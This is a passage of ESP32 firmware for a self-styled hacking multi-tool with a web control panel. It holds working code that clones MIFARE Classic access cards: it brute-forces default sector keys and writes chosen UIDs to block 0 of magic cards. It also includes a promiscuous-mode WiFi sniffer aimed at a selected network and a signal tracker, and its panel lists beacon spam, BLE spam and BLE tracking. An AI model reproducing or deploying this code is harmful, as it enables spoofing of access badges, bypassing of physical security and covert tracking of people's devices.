      tft.fillRect(0, 0, 320, 45, 0x780F);
      tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[NFC CLONE]");
      tft.fillRect(0, 45, 320, 20, 0x2000);
      tft.setCursor(10, 50); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("Written but UID mismatch on verify");
      tft.fillRect(30, 80, 260, 50, 0x2000); tft.drawRect(30, 80, 260, 50, ST77XX_RED);
      tft.setCursor(25, 92); tft.setTextColor(ST77XX_RED); tft.setTextSize(2); tft.print("VERIFY FAIL");
      tft.setCursor(10, 145); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("Re-scan card to confirm.");
    }
  } else {
    addLog("NFC Clone: Write failed");
    tft.fillScreen(ST77XX_BLACK);
    tft.fillRect(0, 0, 320, 45, ST77XX_RED);
    tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[NFC CLONE]");
    tft.fillRect(30, 80, 260, 65, 0x2000); tft.drawRect(30, 80, 260, 65, ST77XX_RED);
    tft.setCursor(30, 93); tft.setTextColor(ST77XX_RED); tft.setTextSize(2); tft.print("WRITE FAIL");
    tft.setCursor(30, 120); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("Card may be locked or not");
    tft.setCursor(30, 133); tft.print("a writable Magic/Gen2 card.");
  }
  delay(3000);
  Blynk.virtualWrite(VP_STATUS, "Idle");
  tft.fillScreen(ST77XX_BLACK);
}

// 7. Manual UID Write
void runManualUIDUpdate() {
  stopFlag = false; exitFlag = false;
  nfc.begin(); nfc.SAMConfig();
  Blynk.virtualWrite(VP_STATUS, "Running: Manual UID");
  addLog("Manual UID started");
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 45, 0x03EF);
  tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[MAN. UID]");
  tft.fillRect(0, 45, 320, 20, 0x1082);
  tft.setCursor(10, 50); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1); tft.print("Mode 71  |  Manual UID Write");
  tft.drawRect(10, 75, 300, 80, ST77XX_CYAN);
  tft.setCursor(20, 83); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1); tft.print("Type UID in Serial Monitor");
  tft.setCursor(20, 97); tft.setTextColor(ST77XX_WHITE); tft.print("Format:  DE AD BE EF");
  tft.setCursor(20, 111); tft.print("     or: DE:AD:BE:EF");
  tft.setCursor(20, 125); tft.print("     or: DEADBEEF");
  tft.fillRect(10, 165, 300, 30, 0x1082);
  tft.drawRect(10, 165, 300, 30, ST77XX_YELLOW);
  tft.setCursor(20, 173); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1); tft.print("Waiting for Serial input... 's'=stop 'm'=menu");
  bool blink = false;
  tft.setCursor(10, 205); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(2); tft.print("> ");
  Serial.println("\n[71] Manual UID Update");
  Serial.println("Enter UID as hex (space, colon, or no separator).");
  Serial.println("Example: DE AD BE EF   or   DE:AD:BE:EF   or   DEADBEEF");
  Serial.print("> ");
  String input = "";
  unsigned long lastBlink = millis();
  while (true) {
    if (millis() - lastBlink > 400) {
      blink = !blink;
      tft.fillRect(26, 205, 12, 18, ST77XX_BLACK);
      tft.setCursor(26, 205); tft.setTextColor(blink ? ST77XX_GREEN : ST77XX_BLACK); tft.setTextSize(2); tft.print("_");
      lastBlink = millis();
    }
    if (Serial.available()) {
      char c = Serial.read();
      if (c == '\n' || c == '\r') { if (input.length() > 0) break; }
      else { input += c; Serial.print(c); }
    }
    if (Serial.peek() == 's' || Serial.peek() == 'm') {
      Serial.read();
      addLog("Manual UID cancelled");
      tft.fillScreen(ST77XX_BLACK);
      tft.setCursor(10, 120); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(2); tft.print("Cancelled");
      delay(1000);
      Blynk.virtualWrite(VP_STATUS, "Idle");
      tft.fillScreen(ST77XX_BLACK);
      return;
    }
    Blynk.run();
    if (webServerStarted) server.handleClient();
    delay(10);
  }
  input.trim();
  if (input.length() == 0) {
    addLog("Manual UID: No input");
    tft.fillScreen(ST77XX_BLACK);
    tft.fillRect(0, 0, 320, 45, ST77XX_RED);
    tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[MAN. UID]");
    tft.fillRect(30, 90, 260, 50, 0x2000); tft.drawRect(30, 90, 260, 50, ST77XX_RED);
    tft.setCursor(50, 103); tft.setTextColor(ST77XX_RED); tft.setTextSize(2); tft.print("NO INPUT");
    delay(2000);
    Blynk.virtualWrite(VP_STATUS, "Idle");
    tft.fillScreen(ST77XX_BLACK); return;
  }
  uint8_t newUID[7]; int uidLen = 0;
  String token = "";
  for (int i = 0; i <= (int)input.length(); i++) {
    char c = (i < (int)input.length()) ? input[i] : ' ';
    if (c == ' ' || c == ':') {
      if (token.length() > 0 && uidLen < 7) { newUID[uidLen++] = (uint8_t)strtol(token.c_str(), NULL, 16); token = ""; }
    } else token += c;
  }
  if (uidLen == 0 && token.length() >= 2) {
    for (int i = 0; i < (int)token.length() && uidLen < 7; i += 2) {
      if (i + 1 < (int)token.length()) {
        char hex[3] = { token[i], token[i+1], '\0' };
        newUID[uidLen++] = (uint8_t)strtol(hex, NULL, 16);
      }
    }
  }
  if (uidLen == 0) {
    addLog("Manual UID: Parse failed");
    tft.fillScreen(ST77XX_BLACK);
    tft.fillRect(0, 0, 320, 45, ST77XX_RED);
    tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[MAN. UID]");
    tft.fillRect(30, 90, 260, 65, 0x2000); tft.drawRect(30, 90, 260, 65, ST77XX_RED);
    tft.setCursor(30, 103); tft.setTextColor(ST77XX_RED); tft.setTextSize(2); tft.print("INVALID");
    tft.setCursor(30, 130); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("Could not parse hex UID.");
    tft.setCursor(30, 143); tft.print("Try: DE AD BE EF");
    delay(2000);
    Blynk.virtualWrite(VP_STATUS, "Idle");
    tft.fillScreen(ST77XX_BLACK); return;
  }
  String uidStr = "";
  for (int i = 0; i < uidLen; i++) {
    if (newUID[i] < 0x10) uidStr += "0";
    uidStr += String(newUID[i], HEX);
    if (i < uidLen - 1) uidStr += ":";
  }
  addLog("Manual UID to write: " + uidStr);
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 45, 0x03EF);
  tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[MAN. UID]");
  tft.fillRect(0, 45, 320, 20, 0x0380);
  tft.setCursor(10, 50); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("UID parsed OK  |  "); tft.print(uidLen * 8); tft.print("-bit");
  tft.setCursor(10, 76); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1); tft.print("UID to write:");
  tft.setCursor(10, 90); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(2); tft.print(uidStr);
  tft.drawRect(10, 118, 300, 55, ST77XX_CYAN);
  tft.setCursor(20, 126); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1); tft.print("Now place MAGIC / GEN2 card");
  tft.setCursor(20, 140); tft.setTextColor(ST77XX_WHITE); tft.print("on the reader to write UID.");
  tft.setCursor(20, 154); tft.setTextColor(ST77XX_YELLOW); tft.print("Timeout: 10 seconds");
  tft.setCursor(10, 185); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(2); tft.print("Scanning...");
  uint8_t tUID[7]; uint8_t tLen;
  if (!nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, tUID, &tLen, 10000)) {
    addLog("Manual UID: Target card timeout");
    tft.fillScreen(ST77XX_BLACK);
    tft.fillRect(0, 0, 320, 45, ST77XX_RED);
    tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[MAN. UID]");
    tft.fillRect(30, 90, 260, 60, 0x2000); tft.drawRect(30, 90, 260, 60, ST77XX_RED);
    tft.setCursor(50, 103); tft.setTextColor(ST77XX_RED); tft.setTextSize(2); tft.print("TIMEOUT");
    tft.setCursor(30, 135); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("No target card detected.");
    delay(2000);
    Blynk.virtualWrite(VP_STATUS, "Idle");
    tft.fillScreen(ST77XX_BLACK); return;
  }
  String tStr = "";
  for (int i = 0; i < tLen; i++) {
    if (tUID[i] < 0x10) tStr += "0"; tStr += String(tUID[i], HEX);
    if (i < tLen - 1) tStr += ":";
  }
  addLog("Manual UID target: " + tStr);
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 45, 0x03EF);
  tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[MAN. UID]");
  tft.fillRect(0, 45, 320, 20, 0x1082);
  tft.setCursor(10, 50); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1); tft.print("Target found  |  Authenticating...");
  tft.setCursor(10, 78); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1); tft.print("Write UID:"); tft.setCursor(10, 90); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print(uidStr);
  tft.setCursor(10, 108); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1); tft.print("Target UID:"); tft.setCursor(10, 120); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print(tStr);
  tft.fillRect(30, 140, 260, 30, 0x2820); tft.drawRect(30, 140, 260, 30, ST77XX_YELLOW);
  tft.setCursor(40, 149); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(2); tft.print("TRYING KEYS...");
  const uint8_t keyList[][6] = {{0xFF,0xFF,0xFF,0xFF,0xFF,0xFF},{0x00,0x00,0x00,0x00,0x00,0x00},{0xA0,0xA1,0xA2,0xA3,0xA4,0xA5},{0xD3,0xF7,0xD3,0xF7,0xD3,0xF7}};
  const int numKeys = sizeof(keyList) / sizeof(keyList[0]);
  bool authOK = false;
  for (int k = 0; k < numKeys && !authOK; k++) {
    tft.fillRect(10, 178, 300, 14, ST77XX_BLACK);
    tft.setCursor(10, 179); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1);
    tft.print("Key "); tft.print(k + 1); tft.print("/"); tft.print(numKeys); tft.print(": ");
    for (int b = 0; b < 6; b++) {
      if (keyList[k][b] < 0x10) tft.print("0");
      tft.print(keyList[k][b], HEX); tft.print(" ");
    }
    if (nfc.mifareclassic_AuthenticateBlock(tUID, tLen, 0, 0, (uint8_t*)keyList[k])) {
      authOK = true; addLog("Manual UID auth OK with key A #" + String(k+1));
    } else if (nfc.mifareclassic_AuthenticateBlock(tUID, tLen, 0, 1, (uint8_t*)keyList[k])) {
      authOK = true; addLog("Manual UID auth OK with key B #" + String(k+1));
    }
    if (!authOK) delay(50);
  }
  if (!authOK) {
    addLog("Manual UID: All auth attempts failed");
    tft.fillScreen(ST77XX_BLACK);
    tft.fillRect(0, 0, 320, 45, ST77XX_RED);
    tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[MAN. UID]");
    tft.fillRect(30, 80, 260, 80, 0x2000); tft.drawRect(30, 80, 260, 80, ST77XX_RED);
    tft.setCursor(40, 93); tft.setTextColor(ST77XX_RED); tft.setTextSize(2); tft.print("AUTH FAILED");
    tft.setCursor(30, 125); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("All keys exhausted.");
    tft.setCursor(30, 139); tft.print("Card may be locked or not");
    tft.setCursor(30, 152); tft.print("a Gen2/Magic writable card.");
    delay(3000);
    Blynk.virtualWrite(VP_STATUS, "Idle");
    tft.fillScreen(ST77XX_BLACK); return;
  }
  tft.fillRect(30, 140, 260, 55, 0x2820); tft.drawRect(30, 140, 260, 55, ST77XX_YELLOW);
  tft.setCursor(55, 152); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(2); tft.print("WRITING...");
  tft.setCursor(40, 178); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("Auth OK  |  Writing block 0...");
  uint8_t block0[16]; memset(block0, 0, 16);
  memcpy(block0, newUID, uidLen);
  if (uidLen == 4) block0[4] = newUID[0] ^ newUID[1] ^ newUID[2] ^ newUID[3];
  if (nfc.mifareclassic_WriteDataBlock(0, block0)) {
    delay(500);
    uint8_t vUID[7]; uint8_t vLen; bool verified = false;
    if (nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, vUID, &vLen, 2000)) {
      verified = (vLen == uidLen);
      if (verified) for (int i = 0; i < uidLen; i++) if (vUID[i] != newUID[i]) verified = false;
    }
    if (verified) {
      addLog("Manual UID SUCCESS! UID: " + uidStr);
      tft.fillScreen(ST77XX_BLACK);
      tft.fillRect(0, 0, 320, 45, 0x03EF);
      tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[MAN. UID]");
      tft.fillRect(0, 45, 320, 20, 0x0380);
      tft.setCursor(10, 50); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("COMPLETE  |  UID written & verified");
      tft.fillRect(30, 80, 260, 50, 0x0200); tft.drawRect(30, 80, 260, 50, ST77XX_GREEN);
      tft.setCursor(70, 92); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(3); tft.print("SUCCESS");
      tft.setCursor(10, 145); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1); tft.print("Written UID:"); tft.setCursor(10, 158); tft.setTextColor(ST77XX_WHITE); tft.print(uidStr);
    } else {
      addLog("Manual UID write done but verify mismatch");
      tft.fillScreen(ST77XX_BLACK);
      tft.fillRect(0, 0, 320, 45, 0x03EF);
      tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[MAN. UID]");
      tft.fillRect(0, 45, 320, 20, 0x2000);
      tft.setCursor(10, 50); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("Written but verify mismatch");
      tft.fillRect(30, 80, 260, 50, 0x2000); tft.drawRect(30, 80, 260, 50, ST77XX_RED);
      tft.setCursor(25, 92); tft.setTextColor(ST77XX_RED); tft.setTextSize(2); tft.print("VERIFY FAIL");
      tft.setCursor(10, 145); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("Re-scan card to check.");
    }
  } else {
    addLog("Manual UID write failed");
    tft.fillScreen(ST77XX_BLACK);
    tft.fillRect(0, 0, 320, 45, ST77XX_RED);
    tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[MAN. UID]");
    tft.fillRect(30, 80, 260, 65, 0x2000); tft.drawRect(30, 80, 260, 65, ST77XX_RED);
    tft.setCursor(30, 93); tft.setTextColor(ST77XX_RED); tft.setTextSize(2); tft.print("WRITE FAIL");
    tft.setCursor(30, 125); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("Card may be locked or not");
    tft.setCursor(30, 138); tft.print("a writable Magic/Gen2 card.");
  }
  delay(3000);
  Blynk.virtualWrite(VP_STATUS, "Idle");
  tft.fillScreen(ST77XX_BLACK);
}

// 8. Signal Tracker
void runSignalTracker() {
  stopFlag = false; exitFlag = false;
  WiFi.mode(WIFI_STA);
  Blynk.virtualWrite(VP_STATUS, "Running: Signal Tracker");
  addLog("Signal Tracker started");
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 40, ST77XX_GREEN);
  drawCenteredText(10, "SIGNAL TRACKER", ST77XX_BLACK, 2);
  tft.fillRect(10, 70, 300, 25, ST77XX_YELLOW);
  tft.setCursor(20, 76); tft.setTextColor(ST77XX_BLACK); tft.setTextSize(1);
  tft.print("Enter target SSID on Serial...");
  tft.setCursor(10, 220); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1);
  tft.print("'s'=stop  'm'=menu");

  String target = getSafeInput();
  if (target == "m") { tft.fillScreen(ST77XX_BLACK); Blynk.virtualWrite(VP_STATUS, "Idle"); return; }
  addLog("Tracking SSID: " + target);
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 30, ST77XX_GREEN);
  drawCenteredText(8, "SIGNAL TRACKER", ST77XX_BLACK, 2);
  tft.setCursor(10, 50); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1);
  tft.printf("Target: %s", target.c_str());
  tft.setCursor(10, 220); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1);
  tft.print("'s'=stop  'm'=menu");
  unsigned long lastRead = 0;
  while (!stopFlag && !exitFlag) {
    if (millis() - lastRead > 1000) {
      lastRead = millis();
      int n = WiFi.scanNetworks();
      int rssi = -100;
      for (int i = 0; i < n; i++) if (WiFi.SSID(i) == target) { rssi = WiFi.RSSI(i); break; }
      String label = rssi > -50 ? "Excellent" : rssi > -65 ? "Good" : rssi > -80 ? "Fair" : "Poor";
      uint16_t color = rssi > -70 ? ST77XX_GREEN : ST77XX_RED;
      tft.fillRect(0, 80, 320, 130, ST77XX_BLACK);
      tft.setCursor(10, 90); tft.setTextColor(color); tft.setTextSize(2); tft.printf("RSSI: %d dBm", rssi);
      tft.setCursor(10, 120); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(2); tft.printf("Status: %s", label.c_str());
      drawSignalBar(150, 125, rssi, color);
      addLog("SSID: " + target + " RSSI: " + String(rssi) + " dBm - " + label);
    }
    if (Serial.available()) {
      char c = Serial.read();
      if (c == 'm' || c == 'M') { exitFlag = true; break; }
      if (c == 's' || c == 'S') { stopFlag = true; break; }
    }
    Blynk.run();
    if (webServerStarted) server.handleClient();
    delay(100);
  }
  if (stopFlag) addLog("Signal Tracker stopped by user");
  else if (exitFlag) addLog("Signal Tracker exited to menu");
  else addLog("Signal Tracker finished");
  Blynk.virtualWrite(VP_STATUS, "Idle");
  tft.fillScreen(ST77XX_BLACK);
}

// Sniffer callback
void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type == WIFI_PKT_MGMT) pktCount++;
}

// 9. Packet Sniffer
void runTargetSniffer() {
  stopFlag = false; exitFlag = false;
  pktCount = 0;
  Blynk.virtualWrite(VP_STATUS, "Running: Sniffer");
  addLog("Sniffer started");
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 40, ST77XX_BLUE);
  drawCenteredText(10, "SNIFFER", ST77XX_WHITE, 2);
  tft.fillRect(10, 70, 300, 25, ST77XX_YELLOW);
  tft.setCursor(20, 76); tft.setTextColor(ST77XX_BLACK); tft.setTextSize(1);
  tft.print("Select target from Serial list...");
  tft.setCursor(10, 220); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1);
  tft.print("'s'=stop  'm'=menu");

  WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(100);
  int n = WiFi.scanNetworks();
  if (n == 0) {
    addLog("No networks found");
    tft.fillScreen(ST77XX_BLACK);
    tft.fillRect(0, 0, 320, 40, ST77XX_RED);
    drawCenteredText(10, "NO NETWORKS", ST77XX_WHITE, 2);
    delay(2000);
    Blynk.virtualWrite(VP_STATUS, "Idle");
    tft.fillScreen(ST77XX_BLACK); return;
  }
  for (int i = 0; i < n && i < 10; i++) {
    Serial.printf("%d. %-20s CH:%d MAC:%s\n", i+1, WiFi.SSID(i).c_str(), WiFi.channel(i), WiFi.BSSIDstr(i).c_str());
  }
  Serial.print("Select network number (1-10): ");
  String choice = getSafeInput();
  if (choice == "m") { tft.fillScreen(ST77XX_BLACK); Blynk.virtualWrite(VP_STATUS, "Idle"); return; }
  int idx = choice.toInt() - 1;
  if (idx < 0 || idx >= n) {
    addLog("Invalid choice");
    Blynk.virtualWrite(VP_STATUS, "Idle");
    tft.fillScreen(ST77XX_BLACK); return;
  }
  String bssid = WiFi.BSSIDstr(idx);
  sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &targetMAC[0], &targetMAC[1], &targetMAC[2], &targetMAC[3], &targetMAC[4], &targetMAC[5]);
  targetChannel = WiFi.channel(idx);
  addLog("Sniffing: " + WiFi.SSID(idx) + " CH:" + String(targetChannel) + " MAC:" + bssid);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&snifferCallback);
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);

  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 40, ST77XX_BLUE);
  drawCenteredText(10, "SNIFFER", ST77XX_WHITE, 2);
  tft.setCursor(10, 50); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1);
  tft.printf("Target: %s", WiFi.SSID(idx).c_str());
  tft.setCursor(10, 220); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1);
  tft.print("'s'=stop  'm'=menu");
  unsigned long lastUpdate = 0;
  while (!stopFlag && !exitFlag) {
    if (millis() - lastUpdate > 1000) {
      lastUpdate = millis();
      tft.fillRect(0, 80, 320, 100, ST77XX_BLACK);
      tft.setCursor(10, 90); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(2); tft.printf("Packets: %lu", pktCount);
      tft.setCursor(10, 120); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.printf("Channel: %d", targetChannel);
      addLog("Sniffer packets: " + String(pktCount));
    }
    if (Serial.available()) {
      char c = Serial.read();
      if (c == 'm' || c == 'M') { exitFlag = true; break; }
      if (c == 's' || c == 'S') { stopFlag = true; break; }
    }
    Blynk.run();
    if (webServerStarted) server.handleClient();
    delay(50);
  }
  esp_wifi_set_promiscuous(false);
  if (stopFlag) addLog("Sniffer stopped by user");
  else if (exitFlag) addLog("Sniffer exited to menu");
  else addLog("Sniffer finished");
  Blynk.virtualWrite(VP_STATUS, "Idle");
  tft.fillScreen(ST77XX_BLACK);
}

// ==================== Web Admin ====================

void handleApiLogs() {
  String json = "[";
  int start = (logCount < MAX_LOG_LINES) ? 0 : logIndex;
  for (int i = 0; i < logCount; i++) {
    int idx = (start + i) % MAX_LOG_LINES;
    if (i > 0) json += ",";
    json += "\"" + logLines[idx] + "\"";
  }
  json += "]";
  server.send(200, "application/json", json);
}

void handleAdmin() {
  String page = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Jaffinator Control</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Courier New', monospace;
      background: #0a0a0a;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .container {
      max-width: 700px;
      width: 100%;
      background: rgba(10, 10, 10, 0.92);
      border: 1px solid #00ff41;
      border-radius: 12px;
      padding: 28px 24px 20px;
      box-shadow: 0 0 30px rgba(0, 255, 65, 0.1);
    }
    .header h1 {
      font-size: 20px;
      color: #00ff41;
      text-shadow: 0 0 8px rgba(0, 255, 65, 0.3);
      letter-spacing: 2px;
      margin-bottom: 20px;
      border-bottom: 1px solid rgba(0, 255, 65, 0.2);
      padding-bottom: 14px;
    }
    .status-box {
      background: rgba(0, 255, 65, 0.05);
      border: 1px solid rgba(0, 255, 65, 0.15);
      border-radius: 8px;
      padding: 12px 16px;
      margin-bottom: 18px;
      color: #c0e0c0;
      font-size: 14px;
      display: flex;
      justify-content: space-between;
    }
    .status-box .label { opacity: 0.6; }
    .status-box .value { color: #00ff41; font-weight: bold; }
    .grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
      margin-bottom: 18px;
    }
    .btn {
      background: rgba(0, 255, 65, 0.06);
      border: 1px solid rgba(0, 255, 65, 0.2);
      border-radius: 8px;
      padding: 12px 8px;
      color: #c0e0c0;
      font-family: 'Courier New', monospace;
      font-size: 13px;
      cursor: pointer;
      transition: 0.2s;
      text-align: center;
    }
    .btn:hover {
      background: rgba(0, 255, 65, 0.12);
      border-color: #00ff41;
      box-shadow: 0 0 20px rgba(0, 255, 65, 0.05);
    }
    .btn.stop {
      border-color: #ff3333;
      color: #ff6666;
      grid-column: span 2;
    }
    .btn.stop:hover {
      background: rgba(255, 0, 0, 0.12);
      border-color: #ff3333;
    }
    .console {
      background: #111;
      border: 1px solid #335533;
      border-radius: 8px;
      padding: 10px 12px;
      max-height: 200px;
      overflow-y: auto;
      font-family: 'Courier New', monospace;
      font-size: 12px;
      color: #88cc88;
      margin-top: 10px;
      white-space: pre-wrap;
      word-wrap: break-word;
    }
    .console::-webkit-scrollbar { width: 8px; }
    .console::-webkit-scrollbar-track { background: #1a1a1a; }
    .console::-webkit-scrollbar-thumb { background: #335533; border-radius: 4px; }
    .footer {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 12px;
      font-size: 12px;
      color: #335533;
      border-top: 1px solid rgba(0, 255, 65, 0.1);
      padding-top: 12px;
    }
    .refresh {
      background: none;
      border: 1px solid #335533;
      color: #557755;
      cursor: pointer;
      font-size: 12px;
      padding: 4px 12px;
      border-radius: 4px;
      font-family: 'Courier New', monospace;
    }
    .refresh:hover {
      border-color: #00ff41;
      color: #00ff41;
    }
  </style>
</head>
<body>
<div class="container">
  <div class="header"><h1>⧩ JAFFINATOR</h1></div>
  <div class="status-box">
    <span class="label">STATUS</span>
    <span class="value" id="statusText">Idle</span>
  </div>
  <div class="grid">
    <button class="btn" onclick="run('wifi_scan')">📡 WiFi Scan</button>
    <button class="btn" onclick="run('beacon')">📶 Beacon Spam</button>
    <button class="btn" onclick="run('ble_spam')">🔵 Win Spam</button>
    <button class="btn" onclick="run('ble_track')">📱 BLE Track</button>
    <button class="btn" onclick="run('nfc_read')">💳 NFC Read</button>
    <button class="btn" onclick="run('nfc_clone')">📋 NFC Clone</button>
    <button class="btn" onclick="run('manual_uid')">✏️ Manual UID</button>
    <button class="btn" onclick="run('signal_tracker')">📶 Signal Track</button>
    <button class="btn" onclick="run('sniffer')">🐽 Sniffer</button>
    <button class="btn stop" onclick="stop()">⛔ STOP</button>
  </div>
  <div class="console" id="console">> Ready</div>
  <div class="footer">
    <span>IP: 192.168.1.135</span>
    <button class="refresh" onclick="fetchStatus()">⟳ Refresh</button>
  </div>
</div>
<script>
  const consoleEl = document.getElementById('console');
  let logLines = [];

  async function fetchStatus() {
    try {
      const res = await fetch('/api/status');
      const data = await res.json();
      document.getElementById('statusText').textContent = data.status || 'Idle';
    } catch (e) { console.warn('Status fetch failed'); }
  }

  async function fetchLogs() {
    try {
      const res = await fetch('/api/logs');
      const data = await res.json();
      if (data.length !== logLines.length || data.join('\n') !== logLines.join('\n')) {
        logLines = data;
        consoleEl.textContent = data.join('\n') || '> No logs';
        consoleEl.scrollTop = consoleEl.scrollHeight;
      }
    } catch (e) { /* ignore */ }
  }

  async function run(tool) {
    try {
      await fetch('/api/run?tool=' + tool);
      fetchStatus();
    } catch (e) { console.error('Run failed'); }
  }

  async function stop() {
    try {
      await fetch('/api/stop');
      fetchStatus();
    } catch (e) { console.error('Stop failed'); }
  }

  fetchStatus();
  fetchLogs();
  setInterval(fetchStatus, 3000);
  setInterval(fetchLogs, 1000);
</script>
</body>
</html>
)rawliteral";
  server.send(200, "text/html", page);
}

// ==================== API handlers ====================
void handleApiRun() {
  String tool = server.arg("tool");
  if (tool.length() == 0) { server.send(400, "text/plain", "Missing tool"); return; }
  if (featureRunning) { server.send(409, "text/plain", "A tool is already running"); return; }
  if (tool == "wifi_scan" || tool == "beacon" || tool == "ble_spam" ||
      tool == "ble_track" || tool == "nfc_read" || tool == "nfc_clone" ||
      tool == "manual_uid" || tool == "signal_tracker" || tool == "sniffer") {
    featureRunning = true;
    currentFeature = tool;
    addLog("Web: starting " + tool);
    server.send(200, "text/plain", "Started " + tool);
  } else {
    server.send(400, "text/plain", "Unknown tool");
  }
}

void handleApiStop() {
  stopFlag = true;
  addLog("Web: stop command received");
  server.send(200, "text/plain", "Stop signal sent");
}

void handleApiStatus() {
  String status = featureRunning ? currentFeature : "Idle";
  String json = "{\"status\":\"" + status + "\"}";
  server.send(200, "application/json", json);
}

// ==================== Blynk Handlers ====================
BLYNK_WRITE(V0) { if (param.asInt() && !featureRunning) { featureRunning = true; currentFeature = "wifi_scan"; addLog("Blynk: start WiFi Scan"); } }
BLYNK_WRITE(V1) { if (param.asInt() && !featureRunning) { featureRunning = true; currentFeature = "beacon"; addLog("Blynk: start Beacon"); } }
BLYNK_WRITE(V2) { if (param.asInt() && !featureRunning) { featureRunning = true; currentFeature = "ble_spam"; addLog("Blynk: start BLE Spam"); } }
BLYNK_WRITE(V3) { if (param.asInt() && !featureRunning) { featureRunning = true; currentFeature = "ble_track"; addLog("Blynk: start BLE Track"); } }
BLYNK_WRITE(V4) { if (param.asInt() && !featureRunning) { featureRunning = true; currentFeature = "nfc_read"; addLog("Blynk: start NFC Read"); } }
BLYNK_WRITE(V5) { if (param.asInt() && !featureRunning) { featureRunning = true; currentFeature = "nfc_clone"; addLog("Blynk: start NFC Clone"); } }
BLYNK_WRITE(V6) { if (param.asInt() && !featureRunning) { featureRunning = true; currentFeature = "manual_uid"; addLog("Blynk: start Manual UID"); } }
BLYNK_WRITE(V7) { if (param.asInt() && !featureRunning) { featureRunning = true; currentFeature = "signal_tracker"; addLog("Blynk: start Signal Tracker"); } }
BLYNK_WRITE(V8) { if (param.asInt() && !featureRunning) { featureRunning = true; currentFeature = "sniffer"; addLog("Blynk: start Sniffer"); } }
BLYNK_WRITE(V9) { if (param.asInt()) { stopFlag = true; addLog("Blynk: stop command"); } }

// ==================== Setup ====================
void setup() {
  Serial.begin(115200);
  delay(1000);
  addLog("=== JAFFINATOR Multi‑Tool ===");
